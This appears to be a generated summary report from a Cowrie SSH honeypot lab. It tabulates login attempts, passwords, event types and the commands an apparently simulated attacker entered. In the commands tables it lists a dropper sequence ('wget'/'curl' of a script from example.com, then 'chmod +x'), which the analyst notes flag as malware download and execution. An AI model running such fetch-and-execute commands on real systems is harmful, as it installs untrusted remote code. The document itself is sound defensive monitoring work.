# impact_honey_monitor — Cowrie Attack Summary

## 1. Input

- Logs analyzed (2 file):
  - `D:\sertifikat_part_2\cyber_project\impact_honey_monitor\logs\cowrie.json`
  - `D:\sertifikat_part_2\cyber_project\impact_honey_monitor\logs\cowrie.json`
- Time filter: `ALL` → `ALL`
- Total events analyzed: **48**
- Unique sessions: **2**
- Unique source IPs: **1**

## 2. High-level patterns

### Top Source IPs

| IP | Hits |
|---|---:|
| `172.20.0.1` | 48 |

### Top Usernames Tried

| Username | Attempts |
|---|---:|
| `root` | 6 |

### Top Passwords Tried

| Password | Attempts |
|---|---:|
| `2305` | 4 |
| `123456` | 2 |

### Top Commands Entered

| Command | Count |
|---|---:|
| `exit` | 4 |
| `wget http://example.com/a.sh` | 2 |
| `curl http://example.com/a.sh` | 2 |
| `chmod +x a.sh` | 2 |

### Top Event Types (eventid)

| EventID | Count |
|---|---:|
| `cowrie.command.input` | 10 |
| `cowrie.session.connect` | 4 |
| `cowrie.client.version` | 4 |
| `cowrie.client.kex` | 4 |
| `cowrie.login.success` | 4 |
| `cowrie.client.size` | 4 |
| `cowrie.session.params` | 4 |
| `cowrie.log.closed` | 4 |
| `cowrie.session.closed` | 4 |
| `cowrie.session.file_download` | 4 |

## 3. IP behavior signatures (top 5 IPs)

### IP `172.20.0.1`
- First seen: `2026-01-31T08:25:39.720905+00:00`
- Last seen: `2026-01-31T09:10:31.252169+00:00`
- Top commands:
  - `exit` (4x)
  - `wget http://example.com/a.sh` (2x)
  - `curl http://example.com/a.sh` (2x)
  - `chmod +x a.sh` (2x)

## 4. Quick analyst notes (heuristics)

- Detected **2** login failures → likely **brute force / credential stuffing**.
- Detected **4** login successes (Cowrie fake) → attacker proceeded to interactive stage.
- Found commands that look like **malware dropper / execution** (e.g. wget/curl/chmod). Count: 3
